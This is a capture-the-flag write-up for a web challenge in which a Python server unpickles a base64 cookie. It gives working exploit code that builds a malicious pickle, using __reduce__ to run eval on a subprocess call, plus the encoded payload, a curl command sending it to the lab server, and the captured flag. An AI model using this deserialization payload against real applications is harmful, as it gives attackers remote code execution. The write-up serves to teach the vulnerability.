# Web Exotic Attacks Jar of Pickles

When visiting the page, we only see a centered image of a pickle jar and a link to */jar*. Clicking */jar* just returns: ***pickle***. But the page has a cookie:

```http
Cookie: pickles=...
```

Changing it to a random value triggered an error:

```typescript
binascii.Error: Incorrect padding
File "/home/ctf/app.py", line 17, in jar
data = base64.urlsafe_b64decode(cookie)
...
```

We found that the server uses the pickles cookie, decodes it from Base64, and then probably tries to load it using Python’s pickle.loads() function. This is a common security issue because pickle can run code, and if a server loads untrusted data with it, attackers can make it run anything they want.

Because the server tries to return the result using **json.dumps(...)**, we needed to avoid returning bytes — so we decoded the result to a string.

```python
import pickle, base64

class Exploit:
    def __reduce__(self):
        import subprocess
        return (eval, ("__import__('subprocess').check_output(['cat','flag.txt']).decode()",))

payload = pickle.dumps(Exploit())
cookie = base64.urlsafe_b64encode(payload).decode()
print(cookie)
```

Output: **gASVXgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxCX19pbXBvcnRfXygnc3VicHJvY2VzcycpLmNoZWNrX291dHB1dChbJ2NhdCcsJ2ZsYWcudHh0J10pLmRlY29kZSgplIWUUpQu**

We sent the malicious payload as a cookie:

```bash
curl -H "Cookie: pickles=gASVXgAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxCX19pbXBvcnRfXygnc3VicHJvY2VzcycpLmNoZWNrX291dHB1dChbJ2NhdCcsJ2ZsYWcudHh0J10pLmRlY29kZSgplIWUUpQu" http://141.85.224.99:8007/jar
```

Output:
```
"SSS{d0nt_3at_t00_m4ny_p1ckl3s}\n"
```
